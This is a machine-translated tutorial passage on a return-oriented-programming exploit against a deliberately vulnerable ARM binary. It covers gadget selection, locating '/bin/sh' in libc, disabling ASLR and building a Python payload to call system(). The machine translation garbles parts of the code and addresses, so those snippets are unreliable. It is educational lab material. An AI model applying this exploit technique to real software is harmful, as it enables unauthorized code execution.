ir">注意:总是能找到一些小玩意，把电脑的控制权还给我们</strong></p><blockquote class="nf ng nh"><p id="b44e" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">0x000ac2c8: ldr r0，[sp，# 4]；添加sp，sp，# 0xcpop {r4，r5，PC }；<br/> 0x00106088: ldr r0，[sp，# 4]；加sp，sp，# 8；pop {r4，PC }；<br/> 0x0001aa08: ldr r0，[sp，# 4]；加sp，sp，# 8；pop {r4，r5，r6，PC }；<br/> 0x00031874: ldr r0，[sp，# 4]；加sp，sp，# 8；pop {r7，PC }；</p><p id="b6a2" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">0x000ec73c: ldr r0，[sp，# 0x 10]；添加sp，sp，# 0x20pop {r4，r5，r7，PC }；<br/> 0x00100f78: ldr r0，[sp，# 0x 18]；pop {r3，r4，r5，r6，r7，PC }；</p></blockquote><p id="50fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些都是有用的小工具，但为了保持我们的利用时间短，使用小工具的持久性有机污染物最少，所以我将使用</p><p id="00c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">0x00031874: <em class="mx"> ldr r0，[sp，# 4]；加sp，sp，# 8；pop {r7，PC }；</em></p><p id="9091" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，将您想要使用的小工具的偏移量复制到某个文本编辑器中(我的是:0x00031874)。你也可以使用上面的任何一个小工具，它们都应该工作正常。它们都可以将数据从堆栈加载到r0寄存器，这是我们作为命令提供给系统函数的第一个参数，它们还可以将pc的控制权交还给系统函数调用方。</p><p id="19e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在进入我们的下一阶段</p><h2 id="df35" class="ml lh iq bd li mm mn dn lm mo mp dp lq jy mq mr lu kc ms mt ly kg mu mv mc mw bi translated">获取“/bin/sh”字符串的地址</h2><p id="4fdf" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">我们需要将“/bin/sh”的地址作为参数传递给r0寄存器，这样当系统函数被调用时，我们将得到一个shell。幸运的是，字符串“/bin/sh”已经存在于我们的libc库中。如果字符串不存在，您应该提供字符串作为输入，并将包含字符串“/bin/sh”的输入位置的地址放入r0寄存器。现在让我们在libc中找到字符串“/bin/sh”的地址。为此，我们可以使用字符串命令。</p><blockquote class="nf ng nh"><p id="b64b" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">user @ Ubuntu:~/course _ lab $ strings—help<br/>用法:strings[options(s)][file(s)]<br/>在[file(s)]中显示可打印的字符串(默认为stdin)<br/>选项有:<br/>-a—-全部扫描整个文件，而不仅仅是数据段【默认】<br/> -d — data仅扫描文件中的数据段<br/> -f — print-file-name在每个字符串前打印文件名<br/> -n — bytes=[number] Locate<br/>-T-radix = { o，d，x}打印以8、10或16为基数的字符串的位置<br/>-w-Include-all-white将所有空格作为有效字符串字符包含在内<br/>-o-radix = o<br/>-T-target =&lt;bfd name&gt;指定二进制文件格式<br/>-e-encoding = { S，S，B，L，B，L}选择字符大小和字节序:<br/>S = 7-7<br/>@&lt;file&gt;Read options from&lt;file&gt;<br/>-h-help显示此信息<br/>-V-V-version打印程序的版本号<br/>字符串:支持的目标:elf 64-x86–64 elf 32-i386 elf 32-iam Cu elf 32-x86–64 a . out-i386-Linux Pei-i386 Pei-x86–64 elf 64-l1om elf 64-k1om elf 64</p></blockquote><p id="b082" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们应该使用-t，-a来获取驻留在库中的字符串的适当偏移量。-t用于以十六进制打印偏移量，以及-a扫描整个库</p><blockquote class="nf ng nh"><p id="6590" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">-t radix={o，d，x}打印以8、10或16为基数的字符串的位置</p><p id="d659" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">-a : all扫描整个文件，而不仅仅是数据部分[默认值]</p></blockquote><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ny"><img src="../Images/d5333dcea43f798d9ec6fa755cf217a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5UmQ67YbXxXpoecYT8SlIg.png"/></div></div></figure><blockquote class="nf ng nh"><p id="2602" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">strings-t x-a libc _ 2.19 . so | grep "/bin/sh "</p></blockquote><p id="2107" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哇，我们得到了字符串“/bin/sh”的偏移量。其0x11db20(十六进制)。现在唯一要做的就是策划我们的利用。</p><h2 id="4760" class="ml lh iq bd li mm mn dn lm mo mp dp lq jy mq mr lu kc ms mt ly kg mu mv mc mw bi translated">最后的利用</h2><p id="be85" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">我将使用我易受攻击的二进制(<a class="ae np" href="http://bashupload.com/3AVVf/bof" rel="noopener ugc nofollow" target="_blank">链接</a>)。我希望你们知道如何利用简单的缓冲区溢出。在这个二进制文件中，pc将在第36个偏移量处被覆盖。</p><p id="3eca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在第36个位置，我们应该提供我们的小工具的地址，我重复地址小工具，而不是偏移量。要找到实际的地址，你只需要把偏移量加到libc基址上就行了。每次加载时，libc的基址都会不同，所以我们应该关闭ALSR。在ubuntu中，您可以通过下面的命令关闭alsr</p><blockquote class="nf ng nh"><p id="c762" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">sudo echo 0 | tee/proc/sys/kernel/randomize _ va _ space</p></blockquote><p id="c70a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这样做之后，我们需要得到系统函数的地址和libc的基地址，所以使用gef将二进制文件加载到gdb i m中，并使用b命令在任何你想要的地方放置一个断点。</p><blockquote class="nf ng nh"><p id="c9d3" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">pi @ raspberrypi:~/ASM/BOF $ gdb BOF<br/>GNU gdb(Raspbian 7 . 7 . 1+dfsg-5+rpi 1)7 . 7 . 1<br/>版权所有2014自由软件基金会，Inc. <br/>许可GPLv3+: GNU GPL版本3或更高版本&lt;<a class="ae np" href="http://gnu.org/licenses/gpl.html" rel="noopener ugc nofollow" target="_blank">http://gnu.org/licenses/gpl.html</a>&gt;<br/>这是自由软件:你可以自由更改和重新发布它。<br/>在法律允许的范围内，不提供任何担保。键入“显示复印”<br/>和“显示保修”了解详情。<br/>这个GDB被配置为“arm-linux-gnueabihf”。<br/>输入“显示配置”了解配置详情。<br/>关于bug报告的说明，请参见:<br/>&lt;<a class="ae np" href="http://www.gnu.org/software/gdb/bugs/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/bugs/</a>&gt;。<br/>在<br/>&lt;<a class="ae np" href="http://www.gnu.org/software/gdb/documentation/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/documentation/</a>&gt;找到GDB手册和其他在线文档资源。如需帮助，请键入“help”。<br/>键入“apropos word”以搜索与“word”相关的命令……<br/>[*]无调试会话活动<br/> GEF for linux就绪，键入“GEF”以启动，键入“gef config”以配置<br/> 56个使用Python引擎2.7为GDB 7.7.1加载的命令<br/> [*] 4个命令无法加载，运行“gef missing”以了解原因。<br/>从bof读取符号……(没有找到调试符号)……完成。<br/>GEF&gt;b main<br/>0x 1048 c处的断点1<br/>GEF&gt;</p></blockquote><p id="7898" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如您在这里看到的，我在main中放置了一个断点，现在使用r命令运行二进制文件。它一运行就会在main中遇到断点。现在使用print命令获取系统函数的地址</p><blockquote class="nf ng nh"><p id="f4a1" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">打印和系统</p></blockquote><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nz"><img src="../Images/1cca553efd80fc736a2824e35d818522.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o6UF8ru1FsIxN4lphDb3og.png"/></div></div></figure><p id="5b46" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以系统函数的地址是0xb6eadfac</p><p id="fba7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来我们需要libc基地址，所以使用vmmap命令显示目标进程的整个内存空间映射。</p><blockquote class="nf ng nh"><p id="fccb" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">虚拟地图</p></blockquote><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oa"><img src="../Images/65945270335eaa0b90780d00d99f32fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EJDZRogyMfhI-ySbzBTwuQ.png"/></div></div></figure><p id="d248" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">库的基址是“Start”下第一个映射的地址</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ob"><img src="../Images/f359b43d75b6e47f93a135c9ed2747f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qAbGXqG99hnPfZBJPosWoA.png"/></div></div></figure><p id="c66f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以libc的基址是‘0xb6e 74000’(用黄色突出显示)</p><p id="a74c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了两个地址，所以将它们复制到文本编辑器或其他地方。</p><p id="c2a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以一切都搞定了。现在我们可以开始写我们的利用。在我的二进制文件中，pc将在第36个位置被覆盖。如您所知，当我们利用一个简单的缓冲区溢出时，我们将精心设计利用方式，我们的外壳代码的起始地址将覆盖pc，以便执行重定向到该特定位置并执行我们的外壳代码。但是在我们的rop中，我们不会指向堆栈中的某个地方，而是以一种我们的小工具的地址会覆盖pc的方式来制造漏洞。这里发生的事情是，执行将被重定向到我们提供的小工具/指令的地址，它将在该地址执行该指令</p><p id="1199" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们创建一个python脚本，你可以使用自己的语言。</p><blockquote class="nf ng nh"><p id="a79c" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">纳米rop.py</p></blockquote><p id="8acf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用垃圾字符填充缓冲区，直到它覆盖pc。所以我会在这里写36个“A”</p><blockquote class="nf ng nh"><p id="3739" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="7382" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">junk = "A" * 36</p></blockquote><p id="f3a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您输入的下一个字符将覆盖pc。这是我们的奇迹发生了</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="mj lf l"/></div></figure><p id="a512" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一个输入应该是小工具的地址</p><blockquote class="nf ng nh"><p id="f655" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">0x00031874: ldr r0，[sp，# 4]；加sp，sp，# 8；pop {r7，PC }；</p></blockquote><p id="ecd0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要获得实际地址，需要将这个偏移量加到libc基址上，因此实际地址是</p><p id="6bc5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">0x00031874 + libc地址= 0x 00031874+0xb6e 74000 = 0x b6ea 5874</p><p id="bfe1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用计算器来检查这一点，我们不需要每次都使用python中的struct模块来手动计算这一点</p><blockquote class="nf ng nh"><p id="e799" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">#!/usr/bin/python <br/>导入结构</p><p id="071f" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">base = 0xb6e74000</p><p id="776e" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">junk = " A " * 36<br/>gadget 1 = struct . pack("&lt;I "，base+0x00031874)</p></blockquote><p id="fa93" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用libc基址创建了一个变量“base”。还有一个名为gadget one的变量，它保存小工具的实际地址。struct.pack中的第一个参数是"<i .it="" specifies="" the="" address="" should="" be="" in="" little="" endian="" format.after="" that="" we="" are="" adding="" base="" with="" gadget="" offset="" to="" get="" of="" gadget.=""/></p><p id="44e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Now take a look at the gadget</p><blockquote class="nf ng nh"><p id="d842" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">ldr r0, [sp, #4]; add sp, sp, #8; pop {r7, pc};</p></blockquote><p id="a533" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Its loading from sp+4 to r0 and adding 8 to the sp .After that its popping out two values from the top of the stack into r7 and pc.Lets see this in gdb .Before that add the print function in the script to output the exploit so that we can provide it to the program</p><blockquote class="nf ng nh"><p id="63aa" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">#!/usr/bin/python<br/> import struct</p><p id="aecc" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">base = 0xb6e74000</p><p id="dac8" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">junk = " A " * 36<br/>gadget 1 = struct . pack("&lt;I "，base+0x00031874)</p><p id="81c8" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">印刷品(垃圾+小配件1)</p></blockquote><p id="65dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在运行这个脚本来查看输出</p><blockquote class="nf ng nh"><p id="0aea" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">pi @ raspberrypi:~/ASM/challenges $ python ROP . py<br/>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatx<br/>pi @ raspberrypi:~/ASM/challenges $</p></blockquote><p id="7709" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">很好…我猜一切都很好..所以启动gdb并再次加载二进制文件</p><blockquote class="nf ng nh"><p id="ea6b" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">pi @ raspberrypi:~/ASM/challenges $ gdb。/BOF<br/>GNU gdb(Raspbian 7 . 7 . 1+dfsg-5+rpi 1)7 . 7 . 1<br/>Copyright 2014 Free Software Foundation，Inc .<br/>License GPLv3+:GNU GPL version 3或更高版本&lt;<a class="ae np" href="http://gnu.org/licenses/gpl.html" rel="noopener ugc nofollow" target="_blank">http://gnu.org/licenses/gpl.html</a>&gt;<br/>这是自由软件:你可以自由更改和重新分发它。<br/>在法律允许的范围内，不提供任何担保。键入“显示复印”<br/>和“显示保修”了解详情。<br/>这个GDB配置为“arm-linux-gnueabihf”。<br/>输入“显示配置”了解配置详情。<br/>关于bug报告的说明，请参见:<br/>&lt;<a class="ae np" href="http://www.gnu.org/software/gdb/bugs/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/bugs/</a>&gt;。<br/>在<br/>&lt;<a class="ae np" href="http://www.gnu.org/software/gdb/documentation/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/documentation/</a>&gt;找到GDB手册和其他在线文档资源。如需帮助，请键入“help”。<br/>键入“apropos word”以搜索与“word”相关的命令……<br/>[*]无调试会话活动<br/> GEF for linux就绪，键入“GEF”以启动，键入“gef config”以配置<br/> 56个使用Python引擎2.7为GDB 7.7.1加载的命令<br/> [*] 4个命令无法加载，运行“gef missing”以了解原因。从…读取符号。/bof…(找不到调试符号)…完成。<br/>全球环境基金&gt;</p></blockquote><p id="726e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我的二进制文件中有一个叫bof的函数，它使用strcpy，这是源代码</p><blockquote class="nf ng nh"><p id="780c" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"># include<stdlib.h><br/># include&lt;unistd . h&gt;<br/># include&lt;stdio . h&gt;<br/># include&lt;string . h&gt;</stdlib.h></p><p id="3478" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">void BOF(char * IP)<br/>{<br/>char buffer[30]；<br/> strcpy(缓冲区，IP)；<br/> printf("你的输出是%s \n "，buffer)；<br/>T37】}</p><p id="bbbe" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">int main(int argc，char * * argv)<br/>{<br/><br/>BOF(argv[1])；</p><p id="182d" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi">}</p></blockquote><p id="ef5a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以反汇编bof函数，在最后一次pop{r11，pc}放一个断点</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oc"><img src="../Images/e6100fa65b4cacebe984382b6461dc05.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JGg03goSgrEgQVntlKmxEw.png"/></div></div></figure><p id="fe41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在用r命令运行二进制文件，并将python脚本输出作为命令行输入提供给程序，您可以这样做</p><blockquote class="nf ng nh"><p id="716c" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">gef&gt; r $(python rop.py)</p></blockquote><p id="4f83" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">按enter将运行程序，将python脚本的输出作为输入，并点击断点</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oa"><img src="../Images/9e4c8cbcdc5d1bb3c2503f9e9eca83cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WsJdEpLeioNhpWkwFc8rEg.png"/></div></div></figure><p id="4334" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个弹出将从栈顶弹出两个值到r11和pc。第一个值0x 41414141(“AAAA”)将被弹出到r11，下一个值(我们的小工具的地址)将被弹出到pc。正如你在这里看到的，它指向我们的小工具“ldr r0，[sp，#4]”。如果你做了一步以上的指示，电脑将指向我们的小工具。</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="le lf l"/></div></figure><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oa"><img src="../Images/67da6b80c7f9921d08ba48754d3c058b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kUTpys84xSXcdf_GOdWlOQ.png"/></div></div></figure><p id="3b72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了…现在它将sp+4中的值加载到r0寄存器中。sp+4是堆栈顶部的第二个值。</p><blockquote class="nf ng nh"><p id="54bd" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">sp = 0xbefff210</p><p id="e704" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">sp+4 = 0x beff 214</p></blockquote><p id="736e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在sp+4保存值2，所以如果我们做一个si，r0将变成2</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oa"><img src="../Images/b19602a0e52316b39907f030f90a0c80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kI3Jfr0XZPKsTUR2ZjQEcQ.png"/></div></div></figure><p id="01af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但我们要做的是将字符串“/bin/sh”的地址加载到r0。为此，我们需要在漏洞中提供字符串的地址。类似地，我们必须将偏移量添加到基地址中</p><blockquote class="nf ng nh"><p id="7759" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">#!/usr/bin/python <br/>导入结构</p><p id="3cc6" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">base = 0xb6e74000</p><p id="ff82" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">junk = " A " * 36<br/>gadget 1 = struct . pack("&lt;I "，base+0x 00031874)# ldr gadget<br/>junk 1 = " AAAA "<br/>binsh = struct . pack("&lt;I "，base+0x11db20) #/bin/sh string</p><p id="f0d2" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">印刷品(垃圾+小配件1+垃圾1+垃圾箱)</p></blockquote><p id="cc77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以这是修改后的漏洞利用…你们可能想知道为什么有一个“AAAA”的junk1。再看一下这个小工具，它从sp+4加载值，对吗？因此，如果a在gadget1之后提供值，它将位于堆栈的顶部，即sp中。但是在我们的例子中，我们需要sp+4中的值，因为我们的小工具只将sp+4中的值加载到r0。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi od"><img src="../Images/23fadee6a20cec9fe139577fe0f39819.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Km9Qyi30XF5Dt4gfNEAHCw.png"/></div></div></figure><p id="dbb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你得到这个:P</p><p id="b3e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">再次将二进制文件加载到gdb中，并在bof函数的最后一个pop{r11，pc}处放置一个断点，然后使用我们的漏洞运行它。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oa"><img src="../Images/21e96a2b75ee4c3d431db0ab1e85021e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jyuuwDg5qkq2jzF3cR6DZw.png"/></div></div></figure><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="le lf l"/></div></figure><p id="de2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哎呀，出了点问题…如果你看sp+4，它的值是0，但是我们提供了字符串的地址，对吗？？然后发生了什么？？</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="oe lf l"/></div></figure><p id="2fce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看看你提供的字符串的地址。现在让我们手动计算这个小工具的实际地址..</p><blockquote class="nf ng nh"><p id="be7b" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">实际地址= libc的基址+字符串的偏移量</p><p id="dd1c" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">= 0xb6e 74000+0x 11 db 20 = 0 xb6f 91 b 20</p></blockquote><p id="bb4a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">没什么奇怪的，对吧？实际上不是，如果你看地址，末尾有一个x20，这实际上是一个十六进制ascii值，表示退格。如果你谷歌一下，你可以看到这个</p><blockquote class="nf ng nh"><p id="90bf" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated"><strong class="jp ir">空格字符</strong>，表示单词之间的空格，由键盘的空格键产生，由代码0x20(十六进制)表示，被认为是非打印图形(或不可见图形)而不是控制字符。</p></blockquote><p id="e3c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个地址没有出现在我们的堆栈中的原因就在于此。我们程序中易受攻击的函数是strcpy。当它遇到一个空格时终止。如你所知，寻址将采用小端格式，因此x20将首先进入堆栈，结果复制终止。这就是我们在堆栈中看到00000000的原因<br/>下一个问题是如何解决这个问题？？？？？？</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="of lf l"/></div></figure><p id="8547" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">x20打破了复制权？那么，如果a提供了一个没有这个x20的地址，并将该地址重新调整回原来的地址，使其指向我们的小工具，那又会怎样呢？听起来很困惑？？</p><p id="1f0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">实际上很容易。所以你要做的第一件事就是提供一个没有x20的地址，并且离我们的小工具很近。例如，我们将地址设置为0xB6F91B21(原始地址= 